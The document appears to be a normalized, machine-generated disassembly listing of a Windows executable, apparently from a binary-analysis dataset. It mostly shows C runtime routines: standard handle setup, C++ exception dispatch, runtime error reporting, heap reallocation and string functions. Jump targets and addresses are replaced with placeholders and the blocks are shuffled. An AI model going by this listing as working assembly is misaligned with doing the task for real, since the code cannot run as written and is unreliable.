mov [ ebp - 0x4 ] eax
mov eax 0x800
cmp edi eax
jl r-xdata
mov ecx [ rw-data ]
lea eax [ ebx + ebx * 8 ]
cmp [ ecx + eax * 4 ] 0xffffffff
lea esi [ ecx + eax * 4 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] edi
jge r-xdata
mov edi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor esi esi
test edi edi
jle r-xdata
mov esi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
mov edi [ rw-data ]
add [ rw-data ] 0x20
mov [ esi ] eax
lea ecx [ eax + 0x480 ]
cmp eax 0x3
jne r-xdata
add [ ebp - 0x4 ] 0x4
inc esi
inc ebx
cmp esi edi
jl r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
add esi 0x4
cmp [ rw-data ] edi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov ecx [ esi ]
add eax 0x24
add ecx 0x480
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test al 0x8
jne r-xdata
push 0x480
call sub_406c98
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
mov cl [ ebx ]
mov [ eax + 0x4 ] cl
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_40b408
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_407236
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_4071f4
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_407236
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_4072ca
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_40b4e8
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_40b521
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_40b521
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_40b521
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jl r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_40c460
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_40c460
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_406430
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_406430
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_406440
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_406440
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_406440
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_40d6cb
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_40c460
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_40d760
add esp 0x10
sub_40b674
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi 0x19930520
cmp [ esi ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je r-xdata
call sub_40bf3d
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push 0x1
pop eax
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40b70f
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe r-xdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_40b9c9
add esp 0x10
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_40b70f
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov eax [ eax + 0x8 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jl r-xdata
call sub_40bf3d
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xe06d7363
push edi
mov edi 0x19930520
cmp [ esi ] ebx
jne r-xdata
jmp sub_40bedc
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40b8c2
add esp 0x20
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
call sub_4090c1
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_407176
add esp 0x14
mov ebx eax
call sub_4090c1
mov esi [ eax + 0x6c ]
call sub_4090c1
mov eax [ eax + 0x70 ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x14 ] 0x1
call sub_40d85e
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebx ] edi
jg r-xdata
cmp [ esi ] ebx
jne r-xdata
call sub_40bf3d
push 0x1
push esi
call sub_40be01
pop ecx
pop ecx
inc [ ebp - 0x4 ]
add ebx 0x14
jmp r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0xc ]
test eax eax
mov [ ebp - 0xc ] eax
jle r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x8 ] eax
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
add [ ebp + 0x8 ] 0x10
cmp [ ebp - 0xc ] 0x0
jg r-xdata
push [ esi + 0x1c ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_40b96c
add esp 0xc
test eax eax
jne r-xdata
call sub_40bf3d
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ edi ]
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40ba7d
add esp 0x2c
dec [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] eax
jg r-xdata
sub_40b8c2
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
call sub_4090c1
cmp [ eax + 0x68 ] 0x0
je r-xdata
mov edi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_407176
add esp 0x14
mov esi eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40704b
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
cmp edi [ esi ]
jl r-xdata
inc [ ebp - 0x4 ]
add esi 0x14
jmp r-xdata
cmp edi [ esi + 0x4 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
push 0x1
add eax 0xfffffff0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ba7d
add esp 0x2c
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
sub_40b96c
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
pop eax
cmp [ eax + 0x8 ] 0x0
lea edx [ eax + 0x8 ]
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_406790
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
jne r-xdata
sub_40b9c9
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jle r-xdata
call sub_40bf3d
cmp esi [ edi + 0x4 ]
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x103
push ebx
push eax
call sub_40be90
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
mov eax [ eax + esi * 8 + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
mov esi [ eax + esi * 8 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_40ba7d
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_40bc3d
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push eax
call sub_406f0b
call sub_406f4d
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_40b9c9
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
push [ ebx + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_40baf8
add esp 0x2c
test eax eax
je r-xdata
sub_40baf8
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x2c ] ebx
and [ ebp - 0x24 ] 0x0
mov esi [ ebp + 0xc ]
mov eax [ esi - 0x4 ]
mov [ ebp - 0x28 ] eax
call sub_4090c1
mov eax [ eax + 0x6c ]
mov [ ebp - 0x1c ] eax
call sub_4090c1
mov eax [ eax + 0x70 ]
mov [ ebp - 0x20 ] eax
call sub_4090c1
mov edi [ ebp + 0x8 ]
mov [ eax + 0x6c ] edi
call sub_4090c1
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x70 ] ecx
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push [ ebp + 0x14 ]
push esi
call sub_406fd2
add esp 0x14
mov [ ebp - 0x2c ] eax
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
call sub_40bbc5
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_40bbc5
mov eax [ ebp - 0x28 ]
mov [ esi - 0x4 ] eax
call sub_4090c1
mov ecx [ ebp - 0x1c ]
mov [ eax + 0x6c ] ecx
call sub_4090c1
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x70 ] ecx
cmp [ edi ] 0xe06d7363
jne r-xdata
retn
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
call sub_40729e
push eax
push edi
call sub_40be01
pop ecx
pop ecx
sub_40bc13
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_40bc3d
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
lea edi [ eax + edx + 0xc ]
and [ ebp - 0x4 ] 0x0
test [ ecx ] 0x8
je r-xdata
mov esi [ ebp + 0x14 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1
push [ esi + 0x18 ]
call sub_40d85e
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x0
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
call sub_40d85e
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40bf3d
push 0x1
push edi
call sub_40d87a
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40d85e
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40d85e
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_40d87a
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
mov [ edi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push 0x1
push edi
call sub_40d87a
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_40d87a
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_408170
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_40d896
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
add esi 0x8
push esi
push [ ebx + 0x18 ]
call sub_40be68
pop ecx
pop ecx
push eax
push edi
call sub_408170
add esp 0xc
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
test [ esi ] 0x4
je r-xdata
add esi 0x8
push esi
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40be68
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_406f3f
jmp r-xdata
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40be68
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_406f46
jmp r-xdata
push eax
call sub_40be68
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_40be01
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_406f3f
or [ ebp - 0x4 ] 0xffffffff
sub_40be68
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add eax esi
test edx edx
jl r-xdata
pop esi
retn
mov esi [ edx + esi ]
mov ecx [ ecx + 0x8 ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_40be90
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_4072c1
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_4072c1
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_40bedc
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x4 ] esi
call sub_4090c1
cmp [ eax + 0x60 ] esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
call sub_4090c1
call [ eax + 0x60 ]
mov [ ebp - 0x4 ] esi
jmp r-xdata
push 0xa
call sub_40b521
push 0x16
call sub_40db87
pop ecx
pop ecx
push 0x3
call sub_408656
sub_40bf3d
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp sub_40bedc
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub_40bf93
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_406c98
pop ecx
jmp r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
push ebx
call sub_406c50
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push 0x9
call sub_409fbd
push ebx
call sub_40a071
pop ecx
mov [ ebp + 0xc ] eax
test eax eax
pop ecx
je r-xdata
mov eax edi
push esi
call sub_40ab72
test eax eax
pop ecx
jne r-xdata
push 0x9
call sub_40a01e
test esi esi
pop ecx
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
push 0x1
pop esi
test esi esi
jne r-xdata
push esi
push ebx
push eax
call sub_40a87c
add esp 0xc
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x1
pop esi
push esi
call sub_40a3c7
mov edi eax
pop ecx
test edi edi
je r-xdata
mov edi ebx
jmp r-xdata
push 0x9
call sub_40a01e
pop ecx
jmp r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
push eax
push ebx
push edi
call sub_4073d0
push ebx
push [ ebp + 0xc ]
call sub_40a09c
add esp 0x14
mov eax esi
push eax
push ebx
push edi
call sub_4073d0
push ebx
push [ ebp + 0xc ]
call sub_40a09c
add esp 0x14
mov eax esi
sub_40c0e0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_40c1a0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
inc edx
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_40c1da
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_40c3fe
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push r--data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_407830
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_407830
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
